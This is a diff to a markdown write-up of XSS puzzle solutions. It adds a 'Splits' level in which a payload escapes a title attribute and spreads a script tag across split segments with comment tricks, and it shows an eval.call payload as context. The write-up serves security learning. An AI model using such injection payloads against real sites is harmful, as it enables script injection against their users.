@@ -55,15 +55,45 @@ function escape(input) {
 
 - Solution
 
-```js
+```html
 <script>eval.call`${'prompt\x281\x29'}`</script>
+```
+
+### 7. Splits
+
+Task
+
+```js
+function escape(input) {
+    // pass in something like dog#cat#bird#mouse...
+    var segments = input.split('#');
+    return segments.map(function(title) {
+        // title can only contain 12 characters
+        return '<p class="comment" title="' + title.slice(0, 12) + '"></p>';
+    }).join('\n');
+}
+```
+
+Solution
+
+```html
+"><script>/*#*/prompt/*#*/(1)/*#*/</script>
+```
+
+- HTML Source
+
+```html
+<p class="comment" title=""><script>/*"></p>
+<p class="comment" title="*/prompt/*"></p>
+<p class="comment" title="*/(1)/*"></p>
+<p class="comment" title="*/</script>"></p>
 ```
 
 # alf.nu/alert1
 
 ### 1. Warmup
 
--Task
+- Task
 
 ```js
 function escape(s) {
@@ -79,7 +109,7 @@ function escape(s) {
 
 ### 2. Adobe
 
--Task
+- Task
 
 ```js
 function escape(s) {
